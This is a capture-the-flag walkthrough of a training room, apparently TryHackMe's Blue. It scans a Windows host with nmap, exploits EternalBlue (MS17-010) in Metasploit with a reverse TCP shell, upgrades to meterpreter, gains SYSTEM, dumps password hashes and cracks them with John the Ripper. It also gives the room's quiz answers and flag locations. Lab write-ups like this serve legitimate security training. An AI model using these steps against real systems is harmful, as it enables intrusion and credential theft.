## Enum: Scanning with nmap


### Task 1: Recon
The first request is to scan the machine. To do this we are going to use nmap to perform service version detection with the -sV option. This is going to probe the open ports. The command below will allow you to up your verbosity with `-vv`. 
```
nmap -sV -vv --script vuln *target*
```

![image](https://github.com/user-attachments/assets/f454e18e-f5d4-464b-9e43-41e31f399eed)

The output shows that:
- MSRPC (Microsoft Remote Procedure Call) is open on port 135
- netbios-ssn is open on port 139
- microsoft-ds is open on port 445

>**Question:** How many ports are open with a port number under 1000
>
>**Answer:** 3


>**Question:** What is the machine vulnerable to?
>
>**Answer:** ms17-010
There are a few vulnerabilities listed on this machine, but this is the answer THM is looking for. This is the EternalBlue vulnerability (CVE-2017-0143 through CVE-2017-0148) which allows for RCE. This vulnerability extends beyond MSFT Windows to any service that uses the Microsoft-SMBv1 server protocol. 

![image](https://github.com/user-attachments/assets/c48d686f-f003-4a5b-a511-b73145ee04e0)
This vulnerability allows remote attackers to execute arbitrary code via crafted packets, aka "Windows SMB Remote Code Execution Vulnerability." All those susceptible to this vulnerability are listed in the CVE:
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
This vulnerability is rated as Critical by Microsoft, and a patch was published to remedy this back in 2017!
https://www.sentinelone.com/blog/eternalblue-nsa-developed-exploit-just-wont-die/


## Exploit: msfconsole
### Task 2: Gain Access

Run metasploit
```
msfconsole
```
Search for the exploit available to ms17_010
![image](https://github.com/user-attachments/assets/d1c9f9a0-a128-475c-b51c-97ba37a994a7)

>**Question:** find the exploitation code
>
>**Answer:** exploit/windows/smb/ms17_010_eternalblue

Select the exploit

```
use 0
```

Show options

```
show options
```

>**Question:** What value do you need to set?
>
>**Answer:** RHOSTS

![image](https://github.com/user-attachments/assets/df7a2aa9-9820-4da4-be9d-1d43e354763c)
![image](https://github.com/user-attachments/assets/f9066c2a-c8f5-4035-8f1c-9a4c867bf0bb)

```
set payload windows/x64/shell/reverse_tcp
```
Run the exploit

```
run
```

## Post-exploit: Gain Access
### Task 3: Escalate

We are now SYSTEM!

![image](https://github.com/user-attachments/assets/c717fb13-762f-4b65-96a1-f126e200c3fc)


Set the system shell to background (ctrl+z)
```
search shell_to_meterpreter
```

>**Question:** What is the name of the post module we will use?
>
>**Answer:** post/multi/manage/shell_to_meterpreter



![image](https://github.com/user-attachments/assets/d60d8397-52c8-4eb3-8ed6-f35d159dbf65)

Use the shell_to_meterpreter as seen above

```
use 0
```

list the sessions
```
sessions -l
```
![image](https://github.com/user-attachments/assets/331948b1-3689-405c-b6c2-8c072a327817)


>**Question:** What option are we required to change?
>
>**Answer:** SESSION

```
set session 1
```

```
run
```
Note: Wait forever for the run to complete, it should take time to process once it reads *'stopping exploit/multi/handler'*

![image](https://github.com/user-attachments/assets/063fea0b-8481-4736-a775-84734993deac)

List the sessions again, and select the meterpreter

```
sessions -i 3
```


```
getsystem
```
Confirm that you are running as system

Run hashdump cmd to get the non-default user
```
hashdump
```
### Task 4: Cracking

![image](https://github.com/user-attachments/assets/c385faec-8c9b-4415-8081-94b8a0570c70)

>**Question:** What is the name of the non-default user?
>
>**Answer:** jon


Running john the ripper, crack the hashed password


![image](https://github.com/user-attachments/assets/47e25664-d720-458b-b3ad-711bb1a338fa)

**Flag 1 at system root:**

![image](https://github.com/user-attachments/assets/1d4e82db-d442-4998-815e-7311fa47b6d0)

**Flag 2 at system32\config:**

![image](https://github.com/user-attachments/assets/5ffb90d4-957f-40a5-95f8-483c28affffa)

**Flag 3 at jon's docs:**

![image](https://github.com/user-attachments/assets/716c6eb3-124d-463b-bbc6-64967bfcd7e5)

## Complete!

![image](https://github.com/user-attachments/assets/520d8364-f9ab-4ee1-9744-b9e849e87986)



